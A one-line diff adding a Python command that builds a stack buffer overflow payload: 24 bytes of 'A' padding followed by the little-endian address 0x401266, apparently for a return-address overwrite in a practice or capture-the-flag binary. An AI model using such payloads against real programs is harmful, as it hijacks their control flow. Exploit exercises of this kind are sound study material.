@@ -1,0 +1,1 @@
+python3 -c "print('41'*24 + (0x401266).to_bytes(8,'little').hex())"
